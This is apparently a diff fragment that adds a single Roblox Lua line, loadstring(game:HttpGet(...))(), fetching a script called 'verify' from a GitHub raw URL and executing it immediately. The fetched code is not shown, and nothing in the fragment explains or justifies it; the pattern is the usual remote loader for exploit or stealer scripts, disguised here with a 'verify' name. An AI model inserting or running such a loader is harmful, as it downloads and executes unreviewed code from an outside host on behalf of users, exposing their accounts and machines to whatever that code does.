@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scptr1155-gif/loadsystem/refs/heads/main/verify"))()
